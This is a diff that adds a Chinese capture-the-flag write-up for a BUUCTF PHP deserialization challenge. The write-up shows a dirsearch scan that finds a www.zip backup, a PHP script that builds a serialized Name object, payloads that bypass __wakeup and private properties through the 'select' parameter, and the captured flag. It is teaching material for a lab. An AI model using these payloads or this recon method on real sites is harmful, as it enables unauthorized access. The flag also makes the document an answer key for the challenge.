@@ -449,6 +449,51 @@ burpsuite抓包<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/3601622
 
 原文链接：https://blog.csdn.net/m0_73734159/article/details/134277587?csdn_share_tail=%7B%22type%22%3A%22blog%22%2C%22rType%22%3A%22article%22%2C%22rId%22%3A%22134277587%22%2C%22source%22%3A%22m0_73734159%22%7D
 
+## [极客大挑战 2019]PHP 1
+
+题目环境：<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699424631460-c57fe260-4fa1-40cf-92ef-ed955ba1a963.png#averageHue=%236dcbcb&clientId=u2474c692-ff3d-4&from=paste&height=806&id=uda183ac0&originHeight=1007&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=84498&status=done&style=none&taskId=u1e38900a-fa76-4e67-8f07-14c70c32bcd&title=&width=1536)
+> 注意这四个字“备份网站”，让我想到了之前自己做网站的时候，有一次上传FTP网站文件，不小心把全部网站文件清空了，我伤心欲绝没有做网站备份文件，自此以后我就把网站文件在本地备份了一份，每更新网站有一次就在本地备份一次，备份格式是ZIP格式，比较节省空间，**所以我这猜测它网站后台必定又一个网站备份ZIP文件**
+
+使用dirsearch工具扫描网站后台（这个工具是我最喜欢的，扫描的比较全面，大部分都可以扫描到，博主有压缩文件可以私聊我进行领取！）<br />`python dirsearch.py -u http://a02fc32b-1091-4b95-a4a1-27fb1bc51ba1.node4.buuoj.cn:81/`<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699425533533-eb6b9883-6536-4344-9078-a9c44a90010d.png#averageHue=%230c0c0c&clientId=u2474c692-ff3d-4&from=paste&height=646&id=ucda16f79&originHeight=808&originWidth=1250&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=12110&status=done&style=none&taskId=u4b8d187a-3ac0-47ea-850d-7eeeef8fb33&title=&width=1000)<br />回车<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699425577064-ca7265a3-9fde-4da2-a4e1-0b1e1b8ead45.png#averageHue=%230d0c0c&clientId=u2474c692-ff3d-4&from=paste&height=647&id=u3d60e2c7&originHeight=809&originWidth=1250&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=118314&status=done&style=none&taskId=u3d887fc5-df80-4dc2-8ec7-49c81f1c992&title=&width=1000)<br />大概需要好几分钟（需耐心等待）<br />扫描出www.zip压缩文件<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699426837799-6cd0e3cb-978e-40b9-ab4a-76666ee9dcda.png#averageHue=%230c0c0c&clientId=u2474c692-ff3d-4&from=paste&height=841&id=uc9a26226&originHeight=1051&originWidth=1899&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=191483&status=done&style=none&taskId=u022c0c1c-3d7d-43aa-831f-e1e3617e0a5&title=&width=1519.2)<br />下载www.zip文件<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699426910784-fc182bf5-3301-48d3-b7b7-919bdee3eeba.png#averageHue=%234c785a&clientId=u2474c692-ff3d-4&from=paste&height=238&id=u9fb4dd8f&originHeight=297&originWidth=1591&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=71358&status=done&style=none&taskId=u044496dc-0bb8-49f5-99f5-a134b26fecc&title=&width=1272.8)<br />回车进行下载<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699426980555-2cf0ce10-f0fa-49f7-963a-25425be8ba98.png#averageHue=%23fcfcfb&clientId=u2474c692-ff3d-4&from=paste&height=723&id=ubc71d8b6&originHeight=904&originWidth=1486&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=119228&status=done&style=none&taskId=ufa51902b-8614-4840-9f92-51d8a5ba168&title=&width=1188.8)<br />**假的flag文件**<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699427027845-904cdb3b-32a6-409a-b45a-be156f99a142.png#averageHue=%23fcfcfc&clientId=u2474c692-ff3d-4&from=paste&height=666&id=u711d2de8&originHeight=832&originWidth=1403&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=19444&status=done&style=none&taskId=u5d0fcbf2-bac8-4223-8b0a-cf6ba733845&title=&width=1122.4)<br />查看index.php文件<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699427132073-a18a32d8-5841-4373-a346-235490053d69.png#averageHue=%23f6f5f3&clientId=u2474c692-ff3d-4&from=paste&height=666&id=uddabc02f&originHeight=832&originWidth=1403&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=75564&status=done&style=none&taskId=ud0ec5519-59d0-4051-950d-4aab065c033&title=&width=1122.4)
+> 发现参数select（通过GET方式进行传参）
+> unserialize反序列化
+
+查看class.php文件<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699427333598-20550d3b-186f-4fe2-8060-03c0a19075f8.png#averageHue=%23fbfbfa&clientId=u2474c692-ff3d-4&from=paste&height=864&id=u72b8cf75&originHeight=1080&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=70744&status=done&style=none&taskId=u0c628c96-2d44-4f86-b3f7-826ed8e9cc9&title=&width=1536)<br />一道反序列化题目(相对简单的反序列化题目）
+> PHP魔法函数以及其他函数的理解可以看这两篇文章：[https://blog.csdn.net/m0_73734159/article/details/133854073?spm=1001.2014.3001.5502](https://blog.csdn.net/m0_73734159/article/details/133854073?spm=1001.2014.3001.5502)
+> [https://blog.csdn.net/m0_73734159/article/details/130661423?spm=1001.2014.3001.5502](https://blog.csdn.net/m0_73734159/article/details/130661423?spm=1001.2014.3001.5502)
+> private私有变量，对象和变量名前需要用%00进行绕过
+> wakeup魔法函数，只需要大于实际变量数即可绕过，比如本题中有两个变量username和password，所以序列化就是O:4:"Name":2:，O对象名，4就是Name是4个字符，2就是Name对象里面有两个变量，大于实际变量数即可绕过O:4:"Name":3:
+> var_dump函数显示关于一个或多个表达式的结构信息，包括表达式的类型与值。数组将递归展开值，通过缩进显示其结构。
+
+想要于万军之中取flag首级（只须满足两个条件）
+> ![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699428755209-763ca749-23c0-4473-a1f4-8af33bba9d1c.png#averageHue=%23fbfbfa&clientId=u2474c692-ff3d-4&from=paste&height=864&id=u29e073f6&originHeight=1080&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=105312&status=done&style=none&taskId=udcfaa116-a7d0-46ed-b9dc-00908853cae&title=&width=1536)
+> 1、满足password=100
+> 2、满足username='admin'
+
+构造exp（取关键代码进行构造）<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699428675037-dd49515d-ecc4-4a7e-a077-d51f0996e275.png#averageHue=%23232525&clientId=u2474c692-ff3d-4&from=paste&height=331&id=u547fa299&originHeight=414&originWidth=970&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=39763&status=done&style=none&taskId=ufa932fca-2556-4587-8860-8c7f1bc8a94&title=&width=776)
+```php
+<?php
+  class Name
+{
+  private $username = 'nonono';
+  private $password = 'yesyes';
+
+public function __construct($username, $password)
+  {
+    $this->username = $username;
+    $this->password = $password;
+  }
+}
+$flag=new Name('admin',100);
+var_dump(serialize($flag));
+?>
+```
+payload:<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699428921775-b2582c38-8667-4966-a504-0ccbd1a554d8.png#averageHue=%23977f63&clientId=u2474c692-ff3d-4&from=paste&height=162&id=u6f30382f&originHeight=202&originWidth=1891&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=30253&status=done&style=none&taskId=uff2029ba-dc8b-4a85-96f0-a461bcc6adf&title=&width=1512.8)`O:4:"Name":2:{s:14:"\000Name\000username";s:5:"admin";s:14:"\000Name\000password";i:100;}`<br />绕过private和wakeup<br />`O:4:"Name":3:{s:14:"%00Name%00username";s:5:"admin";s:14:"%00Name%00password";i:100;}`<br />最终payload：<br />`?select=O:4:"Name":3:{s:14:"%00Name%00username";s:5:"admin";s:14:"%00Name%00password";i:100;}`<br />上传payload：<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699429898776-14a6d42a-1b8f-45e6-ba18-0caf782f2667.png#averageHue=%236dcaca&clientId=u2474c692-ff3d-4&from=paste&height=422&id=u37dcd7e1&originHeight=528&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=106861&status=done&style=none&taskId=u99c61aff-0e4e-4164-b90c-9ad59d25f15&title=&width=1536)<br />**得到flag：**<br />`flag{5750f1c4-ad75-42cf-9bd2-79e668cfc3a4}`
+
+原文链接：https://blog.csdn.net/m0_73734159/article/details/134291787?csdn_share_tail=%7B%22type%22%3A%22blog%22%2C%22rType%22%3A%22article%22%2C%22rId%22%3A%22134291787%22%2C%22source%22%3A%22m0_73734159%22%7D
+
+
+
 
 
 
